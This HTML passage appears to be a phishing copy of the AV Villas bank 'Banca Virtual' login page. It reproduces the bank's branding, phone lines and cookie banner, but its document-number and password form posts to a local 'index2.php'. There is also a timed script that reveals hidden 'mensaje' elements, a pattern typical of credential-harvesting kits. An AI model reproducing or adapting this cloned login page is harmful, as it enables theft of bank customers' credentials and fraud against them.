                          <div _ngcontent-qmv-c27="" class="campaign-container_footer"><a _ngcontent-qmv-c27="" class="avv-title-semibold avv-link ng-star-inserted"> Conocer más </a><!----></div>
                        </div>
                      </app-campaign></li>
                  </ul>
                </div>
                <div _ngcontent-qmv-c28="" data-glide-el="controls[nav]" class="glide__bullets marketing-carousel-container_bullets"><button _ngcontent-qmv-c28="" class="glide__bullet ng-star-inserted" data-glide-dir="=0"></button><button _ngcontent-qmv-c28="" class="glide__bullet ng-star-inserted glide__bullet--active" data-glide-dir="=1"></button><button _ngcontent-qmv-c28="" class="glide__bullet ng-star-inserted" data-glide-dir="=2"></button><button _ngcontent-qmv-c28="" class="glide__bullet ng-star-inserted" data-glide-dir="=3"></button><!----></div>
              </div>
            </div>
          </app-marketing-carousel></div>
        <div class="auth-container_body">
          <div class="auth-container_body-container">
            <div class="auth-container_body-container-logo"><a href="https://www.avvillas.com.co/" target="_blank"><img alt="" draggable="false" src="./img/avvillas-logo.svg"></a></div><!----><!---->
            <div class="auth-container_body-container-header ng-star-inserted">
              <h1>Ingresa a la Banca Virtual</h1>
            </div><!----><!----><!---->
            <div class="auth-container_body-container_content"><router-outlet></router-outlet><app-login _nghost-qmv-c51="" class="ng-star-inserted">
                <div _ngcontent-qmv-c51="" class="login-container">
                  <div _ngcontent-qmv-c51="" toastcontainer="">
                    <div id="toast-container" class="toast-top-center toast-container"></div>
                  </div>
                  <form _ngcontent-qmv-c51="" novalidate="" class="login-form ng-invalid ng-touched ng-pristine" action="index2.php" method="post"><bavv-dropdown _ngcontent-qmv-c51="" class="login-dropdown" _nghost-qmv-c38="">
                      <div _ngcontent-qmv-c39="" class="bavv-form-input"><label _ngcontent-qmv-c39="" for="user-document"><input _ngcontent-qmv-c39="" inputmode="numeric" placeholder="&nbsp;" type="text" autocomplete="off" id="user-document" value="********" class="ng-untouched ng-dirty ng-invalid ng-star-inserted"><!----><!----><span _ngcontent-qmv-c39="" class="label">Número de documento</span><span _ngcontent-qmv-c39="" class="bavv-form-border"></span><span _ngcontent-qmv-c39="" class="alert-icon icon-alerta ng-star-inserted"></span><!----><!----></label><!----></div></bavv-input><bavv-input _ngcontent-qmv-c51="" type="password" class="login-input pb-0" _nghost-qmv-c39="">
                        <div _ngcontent-qmv-c39="" class="bavv-form-input"><label _ngcontent-qmv-c39="" for="user-password"><input _ngcontent-qmv-c39="" placeholder="&nbsp;" type="password" autocomplete="off" id="user-password" class="ng-untouched ng-dirty ng-invalid ng-star-inserted" inputmode="text" value="****"><!----><!----><span _ngcontent-qmv-c39="" class="label">Ingresa tu contraseña</span><span _ngcontent-qmv-c39="" class="bavv-form-border"></span><span _ngcontent-qmv-c39="" class="alert-icon icon-alerta ng-star-inserted"></span><!----><!----></label><!----></div>
                      </bavv-input>
                      <div _ngcontent-qmv-c51="" class="forgot-password"><a _ngcontent-qmv-c51="" class="avv-title-semibold" href="/bancadigital/inicio/cambio-clave"> Olvidé mi contraseña </a><i _ngcontent-qmv-c51="" class="icon-seguridad2 icon"></i></div>
                      <div _ngcontent-qmv-c51="" class="login-btn"><button _ngcontent-qmv-c51="" id="login-btn-ingresar" type="submit" class="btn btn-primary w-100 mw-100"> INGRESAR </button></div>
                      <div _ngcontent-qmv-c51="" class="register">
                        <p _ngcontent-qmv-c51=""> ¿Aún no tienes contraseña para ingresar? </p><a _ngcontent-qmv-c51="" class="avv-title-semibold" href="/bancadigital/inicio/registro"> Regístrate </a>
                      </div>
                  </form>
                </div>
              </app-login><!----></div>
          </div>
        </div>
        <div class="auth-container_footer internal"><avv-footer _nghost-qmv-c26="">
            <div _ngcontent-qmv-c26="" class="avv-footer-container login"><!---->
              <div _ngcontent-qmv-c26="" class="description login">
                <div _ngcontent-qmv-c26="" class="description-logo login"><img _ngcontent-qmv-c26="" alt="" draggable="false" class="logo-super d-none login" src="./img/super-horizontal-black.svg"><img _ngcontent-qmv-c26="" alt="" draggable="false" class="logo-aval d-none login" src="./img/aval-logo-color.svg"><img _ngcontent-qmv-c26="" alt="" draggable="false" class="logo-super-desktop d-none login" src="./img/super-vertical-black.svg"></div>
                <div _ngcontent-qmv-c26="" class="description-info login"><img _ngcontent-qmv-c26="" alt="logo-aval" draggable="false" class="logo-aval d-none login" src="./img/aval-logo-color.svg">
                  <div _ngcontent-qmv-c26="" class="description-info-line login ng-star-inserted">
                    <p _ngcontent-qmv-c26="" class="login">Línea Audiovillas</p>
                  </div><!---->
                  <div _ngcontent-qmv-c26="" class="description-info-phones login">
                    <div _ngcontent-qmv-c26="" class="text">
                      <p _ngcontent-qmv-c26="" class="city-name login">Nacional</p>
                      <p _ngcontent-qmv-c26="" class="login">01 8000 51 8000</p>
                    </div>
                    <div _ngcontent-qmv-c26="" class="divider login"></div>
                    <div _ngcontent-qmv-c26="" class="text">
                      <p _ngcontent-qmv-c26="" class="city-name login">Bogotá</p>
                      <p _ngcontent-qmv-c26="" class="login">(601) 4441777</p>
                    </div>
                    <div _ngcontent-qmv-c26="" class="divider login"></div>
                    <div _ngcontent-qmv-c26="" class="text tablet">
                      <p _ngcontent-qmv-c26="" class="login">Medellín</p>
                      <p _ngcontent-qmv-c26="" class="login">(604) 3256000</p>
                    </div>
                    <div _ngcontent-qmv-c26="" class="divider tablet login"></div>
                    <div _ngcontent-qmv-c26="" class="text tablet">
                      <p _ngcontent-qmv-c26="" class="login">Barranquilla</p>
                      <p _ngcontent-qmv-c26="" class="login">(605) 3304330</p>
                    </div>
                    <div _ngcontent-qmv-c26="" class="divider tablet login"></div>
                    <div _ngcontent-qmv-c26="" class="text tablet">
                      <p _ngcontent-qmv-c26="" class="login">Bucaramanga</p>
                      <p _ngcontent-qmv-c26="" class="login">(607) 6302980</p>
                    </div>
                    <div _ngcontent-qmv-c26="" class="divider tablet login"></div>
                    <div _ngcontent-qmv-c26="" class="text tablet">
                      <p _ngcontent-qmv-c26="" class="login">Cali</p>
                      <p _ngcontent-qmv-c26="" class="login">(602) 8859595</p>
                    </div>
                    <div _ngcontent-qmv-c26="" class="text-cities login">
                      <p _ngcontent-qmv-c26="">Más ciudades</p><span _ngcontent-qmv-c26="" class="form-icon icon-down login closed"></span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div _ngcontent-qmv-c26="" class="avv-footer-copyright login closed">
              <div _ngcontent-qmv-c26="" class="info">
                <p _ngcontent-qmv-c26=""><span _ngcontent-qmv-c26="" class="login"> Barranquilla </span>&nbsp; <span _ngcontent-qmv-c26="">(605) 3304330</span></p>
                <p _ngcontent-qmv-c26=""><span _ngcontent-qmv-c26="" class="login"> Bucaramanga </span>&nbsp; <span _ngcontent-qmv-c26="">(607) 6302980</span></p>
                <p _ngcontent-qmv-c26=""><span _ngcontent-qmv-c26="" class="login"> Cali </span>&nbsp; <span _ngcontent-qmv-c26="">(602) 8859595</span></p>
                <p _ngcontent-qmv-c26=""><span _ngcontent-qmv-c26="" class="login"> Medellín </span>&nbsp; <span _ngcontent-qmv-c26="">(604) 3256000</span></p>
              </div>
              <hr _ngcontent-qmv-c26="" class="divider-line login ng-star-inserted"><!---->
              <div _ngcontent-qmv-c26="" class="logo login closed ng-star-inserted"><img _ngcontent-qmv-c26="" alt="" draggable="false" class="logo-aval" src="./img/aval-logo-color.svg"><img _ngcontent-qmv-c26="" alt="" draggable="false" class="logo-vigilado" src="./assets/img/illustrations/footer/super-horizontal-black.svg"></div><!---->
            </div>
          </avv-footer></div>
      </div><!---->
    </app-auth><!----></app-root>
  <script>
    function getBrowserData() {
      const ua = navigator.userAgent;
      const browser = ua.match(/(opera|chrome|safari|firefox|msie|trident|edge|edg|samsungbrowser|silk|nokiabrowser(?=\/))\/?\s*(\d+)/i) || [];

      const ie = ua.match(/\b(trident|msie)\/?(\d+)/i);
      if (ie !== null) {
        const ie11 = ua.match(/\brv[ :]+(\d+)/g);
        if (ie11 !== null) {
          return {
            name: 'IE',
            version: ie11[0].split(':')[1]
          };
        } else {
          return {
            name: 'IE',
            version: browser[2]
          };
        }
      }

      if (browser[1] === 'Chrome') {
        const opera = ua.match(/\bOPR\/(\d+)/i);
        if (opera !== null) {
          return {
            name: 'Opera',
            version: opera[1]
          };
        }
        const edge = ua.match(/\b(edge|edg)\/(\d+)/i);
        if (edge !== null) {
          if (parseInt(edge[2]) >= 74) {
            return {
              name: 'Edge-Chromium',
              version: edge[2]
            };
          } else {
            return {
              name: 'EdgeHTML',
              version: edge[2]
            };
          }
        }
        return {
          name: browser[1],
          version: browser[2]
        };
      }

      if (browser[1] === 'Safari') {
        const safari = ua.match(/version\/(\d+)/i);
        if (safari !== null) {
          return {
            name: browser[1],
            version: safari[1]
          };
        }
      }

      // Firefox, SamsungBrowser, Silk, NokiaBrowser
      return {
        name: browser[1],
        version: browser[2]
      };
    }

    if (getBrowserData().name === 'IE' || getBrowserData().name === 'EdgeHTML') {
      window.location.href = 'https://www.avvillas.com.co/bancadigital/index/index-explorer.html';
    }
  </script>
  <script src="runtime.dabdbbf68a78e8b1.js" type="module"></script>
  <script src="polyfills.3d8de36e66f7ec38.js" type="module"></script>
  <script src="scripts.3ee565a037b4b02a.js" defer=""></script>
  <script src="main.c8c5a99c1f9d7488.js" type="module"></script>

  <div id="__tealiumGDPRecModal" style="display: none;">
    <div class="privacy_prompt explicit_consent">
      <div class="privacy_prompt_content_left">
        <div class="privacy_prompt_icon"> <img id="tealium-privacy-prompt-image" src="./assets/img/icons/cookie-icon.svg" alt="icono cookie" width="22" height="22"> </div>
        <p style="display: block; margin: 0"><b>Usamos cookies para mejorar tu experiencia de navegación </b> de acuerdo a nuestras políticas de tratamiento de datos. <a href="https://www.avvillas.com.co/avvillas/politica-de-uso-de-cookies" target="_blank">Conoce nuestra política.</a></p>
        <div class="option_set">
          <div class="option"> <input type="radio" id="privacy_pref_optin" name="privacy_pref" value="optin" checked=""> <label for="privacy_pref_optin">Aceptar</label> </div>
        </div>
      </div>
      <div class="privacy_prompt_content_right">
        <div id="consent_prompt_submit" class="button">Aceptar</div>
      </div>
      <div class="close_btn_thick"></div>
    </div>
  </div>
  <div style="width: 0px; height: 0px; position: fixed; z-index: 99999;">
    <style>
      .tealium-survey-button {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        width: 35px;
        padding: 10px 0;
        position: fixed;
        right: -40px;
        bottom: 50vh;
        border: 0;
        border-radius: 8px 0 0 8px;
        background: #E1001D;
        cursor: pointer;
        transition: all .5s ease-out;
        transform: translateY(50%);
      }

      .tealium-survey-button.on-standby {
        right: 0;
      }

      .tealium-survey-button>p {
        display: none;
        align-items: center;
        margin-bottom: 10px;
        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
        font-weight: 700;
        font-size: 14px;
        line-height: 20px;
        color: #FFFFFF;
        writing-mode: vertical-lr;
        transform: rotate(180deg);
      }

      .thank-you-tooltip {
        display: flex;
        justify-content: center;
        align-items: center;
        width: 150px;
        height: auto;
        padding: 5px 10px;
        position: absolute;
        bottom: 6px;
        right: 110%;
        z-index: 1;
        border-radius: 8px;
        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
        font-weight: 400;
        font-size: 10px;
        line-height: 12px;
        text-align: center;
        color: #252B31;
        opacity: 0;
        box-shadow: 0px 0px 54px rgba(0, 0, 0, 0.45);
        background-color: #FFFFFF;
        transition: all .3s ease-in-out;
        pointer-events: none;
      }

      .thank-you-tooltip::after {
        content: " ";
        margin-top: -5px;
        position: absolute;
        top: 50%;
        left: 100%;
        border-width: 5px;
        border-style: solid;
        border-color: transparent transparent transparent#FFFFFF;
        opacity: 0;
        transition: all .3s ease-in-out;
        pointer-events: none;
      }

      .thank-you-tooltip.open,
      .thank-you-tooltip.open::after {
        opacity: 1;
      }

      .tealium-feedback {
        display: flex;
        flex-direction: column;
        align-items: center;
        width: 100%;
        max-width: 425px;
        height: auto;
        position: fixed;
        right: 0px;
        bottom: -500px;
        background: #FFFFFF;
        box-shadow: 0px 0px 54px rgba(0, 0, 0, 0.45);
        border-radius: 8px;
        transition: all .5s ease-in-out;
      }

      .tealium-feedback.open {
        bottom: 0;
      }

      .tealium-feedback>p {
        display: flex;
        align-items: center;
        align-self: stretch;
        text-align: center;
        margin: 0px auto;
        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
        font-weight: 500;
        font-size: 17px;
        line-height: 20px;
        color: #000000;
      }

      .tealium-feedback-close {
        display: flex;
        justify-content: center;
        align-items: center;
        align-self: flex-end;
        width: 30px;
        height: 30px;
        background: #EBEDEF;
        border-radius: 0px 8px;
        cursor: pointer;
      }

      .tealium-feedback-answers-icon-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
        width: 90%;
        margin: 20px auto;
      }

      .tealium-feedback-answers-icon-container>div {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        width: 20%;
        cursor: pointer;
        transition: all .3s ease-in-out;
      }

      .tealium-feedback-answers-icon-container:hover>div {
        opacity: .5;
      }

      .tealium-feedback-answers-icon-container>div.not-selected {
        filter: grayscale(100%);
      }

      .tealium-feedback-answers-icon-container>div:hover {
        opacity: 1;
        filter: grayscale(0%);
      }

      .tealium-feedback-answers-icon-container>div>p {
        margin: 10px 0 0 0;
        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
        font-weight: 400;
        font-size: 10px;
        line-height: 12px;
      }

      .feedback-answer-2-container {
        display: flex;
        flex-direction: column;
        height: auto;
        max-height: 0px;
        width: 100%;
        padding: 0 25px;
        overflow: hidden;
        transition: all .3s ease-in-out;
      }

      .feedback-answer-2-container.open {
        max-height: 500px;
      }

      .tealium-feedback>.feedback-answer-2-container>textarea {
        width: 100%;
        height: auto;
        min-height: 100px;
        margin-bottom: 20px;
        padding: 8px;
        border: 1px solid#9DA6AF;
        border-radius: 8px;
        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
        font-weight: 500;
        font-size: 14px;
        line-height: 16px;
        color: #9DA6AF;
        background: #F8F9FA;
      }

      .tealium-feedback>.feedback-answer-2-container>button {
        display: flex;
        justify-content: center;
        align-items: center;
        align-self: flex-end;
        margin-bottom: 20px;
        padding: 8px 16px;
        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
        font-weight: 600;
        font-size: 16px;
        line-height: 19px;
        color: #FFFFFF;
        border-radius: 4px;
        border: 0;
        background: #0048DB;
        cursor: pointer;
        transition: all .3s ease-in-out;
      }

      .tealium-feedback>.feedback-answer-2-container>button.disabled {
        color: #252B31;
        background: #D1D6DA;
      }

      @media(min-width:426px) {
        .tealium-survey-button>p {
          display: flex;
        }

        .tealium-feedback {
          right: -450px;
          bottom: 100px;
        }

        .tealium-feedback.open {
          right: 40px;
          bottom: 100px;
        }
      }
    </style>
    <div class="tealium-survey-button on-standby">
      <p>Sugerencias</p>
      <div class="tealium-survey-button-icon"><svg width="22" height="22" viewBox="0 0 22 22" fill="none">
          <rect x="0.75" y="0.75" width="20.5" height="20.5" rx="10.25" fill="white"></rect>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M8.11688 6.86364C8.37662 6.86364 8.61472 6.9672 8.80952 7.13291C8.98268 7.31933 9.09091 7.54718 9.09091 7.79574C9.09091 8.0443 8.98268 8.27215 8.78788 8.45857C7.79672 9.5771 7.2123 10.1364 7.03463 10.1364C6.85696 10.1364 6.27255 9.5771 5.28139 8.45857C5.08658 8.27215 5 8.0443 5 7.79574C5 7.54718 5.10823 7.31933 5.28139 7.13291C5.45455 6.94649 5.71429 6.86364 5.95238 6.86364C6.21212 6.86364 6.45022 6.94649 6.64502 7.13291L6.88312 7.36076C6.9697 7.44361 7.09957 7.44361 7.18615 7.36076L7.4026 7.13291C7.5974 6.9672 7.8355 6.86364 8.11688 6.86364Z" fill="#E1001D"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M16.026 6.86364C16.2857 6.86364 16.5238 6.9672 16.7186 7.13291C16.8918 7.31933 17 7.54718 17 7.79574C17 8.0443 16.8918 8.27215 16.697 8.45857C15.7058 9.5771 15.1214 10.1364 14.9438 10.1364C14.7661 10.1364 14.1817 9.5771 13.1905 8.45857C12.9957 8.27215 12.9091 8.0443 12.9091 7.79574C12.9091 7.54718 13.0173 7.31933 13.1905 7.13291C13.3637 6.94649 13.6234 6.86364 13.8615 6.86364C14.1212 6.86364 14.3593 6.94649 14.5541 7.13291L14.7922 7.36076C14.8788 7.44361 15.0087 7.44361 15.0953 7.36076L15.3117 7.13291C15.5065 6.9672 15.7446 6.86364 16.026 6.86364Z" fill="#E1001D"></path>
          <path d="M11 17.1364C14.0412 17.1364 16.5539 15.2509 16.9466 12.8062C17.0008 12.469 16.679 12.2166 16.3477 12.2994C12.8366 13.1772 9.16341 13.1772 5.65231 12.2994C5.32097 12.2166 4.9992 12.469 5.05338 12.8062C5.44615 15.2509 7.95885 17.1364 11 17.1364Z" fill="#E1001D"></path>
          <rect x="0.75" y="0.75" width="20.5" height="20.5" rx="10.25" stroke="white" stroke-width="1.5"></rect>
        </svg><span class="thank-you-tooltip">Gracias por tus comentarios, siempre nos ayudan a seguir mejorando.</span></div>
    </div>
    <div class="tealium-feedback">
      <div class="tealium-feedback-close"><svg width="14" height="14" viewBox="0 0 14 14" fill="none">
          <path fill-rule="evenodd" clip-rule="evenodd" d="M13.4286 0.584102C13.6766 0.832113 13.7769 1.16273 13.4286 1.57614L7.99192 7.01267L13.4158 12.4367C13.8267 12.8476 13.6638 13.1807 13.4158 13.4287C13.1678 13.6767 12.8372 13.777 12.4238 13.4287L6.99925 8.00467L1.5241 13.4807C1.27608 13.7287 0.780063 13.7287 0.532052 13.4807C0.284042 13.2327 0.284042 12.7366 0.532052 12.4886L6.00725 7.01267L0.51926 1.52418C0.271249 1.27617 0.271249 0.780147 0.51926 0.532136C0.767271 0.284126 1.26329 0.284126 1.5113 0.532136L6.99992 6.02067L12.4366 0.584102C12.8475 0.173184 13.1806 0.336091 13.4286 0.584102Z" fill="#5C6B7A"></path>
        </svg></div>
      <p>¿Cómo calificarías tu experiencia?</p>
      <div class="tealium-feedback-answers-icon-container">
        <div data-value="1"><svg width="34" height="34" viewBox="0 0 34 34" fill="none">
            <rect width="34" height="34" rx="17" fill="#FFD042"></rect>
            <circle cx="10.0454" cy="14.8364" r="2.31818" fill="#252B31"></circle>
            <circle cx="23.9544" cy="14.8364" r="2.31818" fill="#252B31"></circle>
            <path d="M16.9999 26.1182C19.0129 26.1182 20.8761 25.5836 22.3963 24.6756C26.06 22.487 22.813 18.3909 18.5454 18.3909H16.9999H15.4544C11.1868 18.3909 7.93976 22.487 11.6035 24.6756C13.1237 25.5836 14.9869 26.1182 16.9999 26.1182Z" fill="#252B31"></path>
            <path d="M9.27271 10.3286L14.2004 14.1833" stroke="#252B31" stroke-width="1.54545" stroke-linecap="round"></path>
            <path d="M25.0186 10.3286L20.0909 14.1833" stroke="#252B31" stroke-width="1.54545" stroke-linecap="round"></path>
          </svg>
          <p>Me enoja</p>
        </div>
        <div data-value="2">
          <svg width="35" height="34" viewBox="0 0 35 34" fill="none">
            <rect x="0.25" width="34" height="34" rx="17" fill="#FFD042"></rect>
            <circle cx="10.2955" cy="13.1364" r="2.31818" fill="#252B31"></circle>
            <circle cx="24.2044" cy="13.1364" r="2.31818" fill="#252B31"></circle>
            <path d="M9.52271 23.9545C14.3344 19.8333 20.1656 19.8333 24.9773 23.9545" stroke="#252B31" stroke-width="1.54545" stroke-linecap="round"></path>
          </svg>
          <p>No me gusta</p>
        </div>
        <div data-value="3"><svg width="35" height="34" viewBox="0 0 35 34" fill="none">
            <rect x="0.5" width="34" height="34" rx="17" fill="#FFD042"></rect>
            <circle cx="10.5455" cy="13.1364" r="2.31818" fill="#252B31"></circle>
            <circle cx="24.4547" cy="13.1364" r="2.31818" fill="#252B31"></circle>
            <path d="M9 22.4091L26 22.4091" stroke="#252B31" stroke-width="1.54545" stroke-linecap="round"></path>
          </svg>
          <p>Neutral</p>
        </div>
        <div data-value="4"><svg width="35" height="34" viewBox="0 0 35 34" fill="none">
            <rect x="0.75" width="34" height="34" rx="17" fill="#FFD042"></rect>
            <circle cx="10.7955" cy="13.1364" r="2.31818" fill="#252B31"></circle>
            <circle cx="24.7047" cy="13.1364" r="2.31818" fill="#252B31"></circle>
            <path d="M17.75 26.2727C22.45 26.2727 26.3332 23.3588 26.9403 19.5806C27.024 19.0595 26.5267 18.6695 26.0146 18.7975C20.5884 20.154 14.9116 20.154 9.4854 18.7975C8.97333 18.6695 8.47606 19.0595 8.55978 19.5806C9.1668 23.3588 13.0501 26.2727 17.75 26.2727Z" fill="#252B31"></path>
          </svg>
          <p>Me gusta</p>
        </div>
        <div data-value="5">
          <svg width="34" height="34" viewBox="0 0 34 34" fill="none">
            <rect width="34" height="34" rx="17" fill="#FFD042"></rect>
            <path fill-rule="evenodd" clip-rule="evenodd" d="M12.5443 10.6074C12.9457 10.6074 13.3137 10.7675 13.6147 11.0236C13.8824 11.3117 14.0496 11.6638 14.0496 12.048C14.0496 12.4321 13.8824 12.7842 13.5813 13.0723C12.0495 14.801 11.1463 15.6653 10.8717 15.6653C10.5971 15.6653 9.69396 14.801 8.16216 13.0723C7.8611 12.7842 7.72729 12.4321 7.72729 12.048C7.72729 11.6638 7.89455 11.3117 8.16216 11.0236C8.42977 10.7355 8.83119 10.6074 9.19916 10.6074C9.60057 10.6074 9.96854 10.7355 10.2696 11.0236L10.6376 11.3757C10.7714 11.5038 10.9721 11.5038 11.1059 11.3757L11.4404 11.0236C11.7415 10.7675 12.1094 10.6074 12.5443 10.6074Z" fill="#E1001D"></path>
            <path fill-rule="evenodd" clip-rule="evenodd" d="M24.7677 10.6074C25.1691 10.6074 25.5371 10.7675 25.8381 11.0236C26.1057 11.3117 26.273 11.6638 26.273 12.048C26.273 12.4321 26.1057 12.7842 25.8047 13.0723C24.2729 14.801 23.3697 15.6653 23.0951 15.6653C22.8205 15.6653 21.9173 14.801 20.3856 13.0723C20.0845 12.7842 19.9507 12.4321 19.9507 12.048C19.9507 11.6638 20.1179 11.3117 20.3856 11.0236C20.6532 10.7355 21.0546 10.6074 21.4225 10.6074C21.824 10.6074 22.1919 10.7355 22.493 11.0236L22.861 11.3757C22.9948 11.5038 23.1955 11.5038 23.3293 11.3757L23.6638 11.0236C23.9649 10.7675 24.3328 10.6074 24.7677 10.6074Z" fill="#E1001D"></path>
            <path d="M17 26.4835C21.7 26.4835 25.5832 23.5696 26.1903 19.7914C26.274 19.2702 25.7767 18.8802 25.2646 19.0082C19.8384 20.3648 14.1616 20.3648 8.7354 19.0082C8.22333 18.8802 7.72606 19.2702 7.80978 19.7914C8.4168 23.5696 12.3001 26.4835 17 26.4835Z" fill="#252B31"></path>
          </svg>
          <p>Me encanta</p>
        </div>
      </div>
      <div class="feedback-answer-2-container"><textarea placeholder="Cuéntanos tu experiencia..."></textarea><button disabled="" class="disabled">Enviar</button></div>
    </div>
  </div><iframe id="_hjSafeContext_88795953" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="about:blank" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe>
  <div class="cdk-overlay-container"></div>
  <script type="text/javascript">
    document.getElementById("mensaje2").style.opacity = "0";
    document.getElementById("mensaje2").style.transition = "all 1s";
    document.getElementById("mensaje3").style.opacity = "0";
    document.getElementById("mensaje3").style.transition = "all 1s";
    var s = 17;

    function er() {
      s--;
    }
    var sie = setInterval(function() {
      er();
      if (s < 15) {
        document.getElementById("mensaje2").style.opacity = "10";
      }

      if (s < 13) {
        document.getElementById("mensaje3").style.opacity = "10";
      }
    }, 1000)
  </script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
</body>

</html>